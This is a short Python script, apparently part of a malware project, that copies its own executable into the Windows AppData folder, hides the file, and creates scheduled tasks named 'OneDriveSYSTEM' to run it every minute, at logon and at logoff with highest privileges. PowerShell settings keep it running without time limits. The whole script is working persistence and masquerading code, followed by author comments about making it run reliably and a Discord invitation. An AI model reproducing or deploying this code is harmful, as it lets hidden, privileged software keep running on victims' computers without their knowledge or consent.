import os,shutil,subprocess,sys
def run_all():
 appdata_roaming_folder=os.path.join(os.path.expanduser("~"),"AppData","Roaming")
 exe_dest=os.path.join(appdata_roaming_folder,"main.exe")
 if not os.path.exists(exe_dest):
  shutil.copy(sys.executable,exe_dest)
 subprocess.run(f'attrib +h "{exe_dest}"',shell=True)
 exe_dest_quoted=f'"{exe_dest}"'
 subprocess.run(f'schtasks /create /tn "OneDriveSYSTEM" /tr {exe_dest_quoted} /sc minute /mo 1 /rl HIGHEST /f',shell=True)
 subprocess.run([ "powershell","-Command",'''$task=Get-ScheduledTask -TaskName "OneDriveSYSTEM"
 $settings=$task.Settings
 $settings.StartWhenAvailable=$true
 $settings.StopIfGoingOnBatteries=$false
 $settings.ExecutionTimeLimit="PT0S"
 Set-ScheduledTask -TaskName "OneDriveSYSTEM" -Settings $settings'''])
 subprocess.run(f'schtasks /create /tn "OneDriveSYSTEMLogon" /tr {exe_dest_quoted} /sc onlogon /rl HIGHEST /f',shell=True)
 subprocess.run(f'schtasks /create /tn "OneDriveSYSTEMLogoff" /tr {exe_dest_quoted} /sc onlogoff /rl HIGHEST /f',shell=True)
run_all()
# i had to config it to decrease the chance of it not running
# also yk i just like when the code is compressed like this
# if u guys actually reading this go into the media channel in discord and say hi